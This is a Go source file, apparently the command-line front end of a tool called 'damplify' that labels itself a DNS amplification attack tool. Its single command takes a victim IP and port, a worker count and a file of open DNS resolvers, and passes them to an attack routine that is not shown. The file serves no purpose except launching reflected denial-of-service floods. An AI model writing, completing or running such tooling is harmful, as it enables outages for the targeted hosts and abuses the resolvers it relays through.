package cmd

import (
	"fmt"
	"github.com/nick-triller/damplify/pkg"
	"log"
	"net"
	"os"
	"strconv"

	"github.com/spf13/cobra"
)

var (
	workers       *int
	resolversPath *string
)

var rootCmd = &cobra.Command{
	Use:       "damplify <targetIP> <targetPort>",
	Short:     "A DNS ampflification attack tool",
	ValidArgs: []string{"targetIP", "targetPort"},
	Args:      cobra.ExactArgs(2),
	Run: func(cmd *cobra.Command, args []string) {
		targetIP := net.ParseIP(args[0])
		if targetIP == nil {
			log.Fatal("targetIP is invalid")
		}
		targetPort, err := strconv.Atoi(args[1])
		if err != nil {
			log.Fatal("targetPort is invalid")
		}
		pkg.Attack(targetIP, targetPort, *workers, *resolversPath)
	},
}

func Execute() {
	if err := rootCmd.Execute(); err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
}

func init() {
	workers = rootCmd.Flags().Int("workers", 10, "Number of worker routines")
	resolversPath = rootCmd.Flags().String("resolversPath", "resolvers.txt", "Path to file containing resolver IPs")
}
